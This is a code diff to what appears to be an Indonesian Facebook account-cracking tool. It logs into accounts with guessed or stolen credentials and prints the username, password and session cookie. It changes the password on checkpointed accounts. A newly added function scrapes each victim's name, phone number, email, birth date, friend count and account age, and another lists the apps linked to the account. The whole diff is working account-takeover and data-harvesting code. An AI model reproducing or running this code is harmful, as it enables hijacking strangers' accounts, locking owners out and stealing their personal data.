@@ -86,8 +86,8 @@ class Eksekusi(Main):
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				if self.satua==True:
 					print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
-				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}                   \n\n",end="")
-				print("[{BM}+{P}] Apk yang terkait:")
+				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
+				self.get_info(session,coki)
 				self.cek_apk(session,coki)
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
@@ -111,7 +111,6 @@ class Eksekusi(Main):
 						self.ubah_pw(session,response,link2)
 					else:
 						print(f"\r[{H}√{P}] {H}Akun tap yes{P}\n[=] Cookie: {BM}{coki}{P}\n")
-						print(f"[{BM}+{P}] {K}Apk yang terkait:{P}")
 						self.cek_apk(session,coki)
 				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
 					print(f"\r[{M}×{P}] {M}Akun a2f on            {P}\n")
@@ -136,7 +135,7 @@ class Eksekusi(Main):
 					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 					if self.satua==True:
 						print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
-					print(f"[{BM}+{P}] Apk yang terkait:")
+					self.get_info(session,coki)
 					self.cek_apk(session,coki)
 					
 		else:
@@ -159,8 +158,39 @@ class Eksekusi(Main):
 			dat2.update({"password_new":"".join(pwBaru)})
 			an=session.post(self.url+link3.get("action"),data=dat2)
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n    ",end="")
-			self.cek_apk(session,coki)
+			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
+			if "checkpoint" not in coki:
+				self.get_info(session,coki)
+				self.cek_apk(session,coki)
+			else:
+				print("")
+	def get_info(self,session,coki):
+		get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
+		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
+		response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
+		response3 = session.get(f"https://mbasic.facebook.com/{self.user}/allactivity/?entry_point=settings_yfi&settings_tracking=unknown%3Asettings_2_0&privacy_source=your_facebook_information&_rdr",cookies={"cookie":coki}).text
+		try:
+			tahun = re.findall('\<a\ href\=\"\/\d+\/allactivity\/\?category\_key\=all&amp\;section\_id\=month\_.*?\_2\&amp\;timestart\=.*?\"\>(.*?)<\/a>',str(response3))[-1]
+		except:
+			tahun=""
+		try:
+			nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
+		except:
+			nomer = ""
+		try:
+			email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
+		except:
+			email=""
+		try:
+			ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
+		except:
+			ttl=""
+		try:
+			teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+		except:
+			teman = ""
+		print(f"[{H}={P}] Nama: {K}{nama}{P}\n[{H}={P}] Tahun pembuatan: {K}{tahun}{P}\n[{H}={P}] Teman: {K}({teman}){P}\n[{H}={P}] Nomer-ponsel: {K}{nomer}{P}\n[{H}={P}] Email: {K}{email}{P}\n[{H}={P}] Tanggal-lahir: {K}{ttl}{P}")
 	def cek_apk(self,session,coki):
 		hit1, hit2 = 0,0
 		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -168,24 +198,22 @@ class Eksekusi(Main):
 		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 			print(f"{P}[+] Apk yang terkait:")
 			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
-				print(f"    • {BM}Apk aktif:{P}")
-				print("    [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
+				print(" * Tidak ada apk aktif yang terkait")
 			else:
-				print(f"    • {BM}Apk aktif:{P}")
-				apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
-				ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
+				print(f"{P}[+] Apk aktif:")
+				apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
+				ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
 				for muncul in apkAktif:
 					hit1+=1
 					print(f"    [{BM}{hit1}{P}]. {H}{muncul} -> {ditambahkan[hit2]}{P}")
 					hit2+=1
-			if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
-				print("    • {BM}Apk kadaluarsa:{P}")
-				print("    [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
+			if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
+				print(" * Tidak ada apk kadaluarsa yang terkait")
 			else:
 				hit1,hit2=0,0
 				print(f"{P}[+] Apk kadaluarsa:")
-				apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
-				kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
+				apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
+				kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
 				for muncul in apkKadaluarsa:
 					hit1+=1
 					print(f"    [{BM}{hit1}{P}]. {K}{muncul} -> {kadaluarsa[hit2]}{P}")
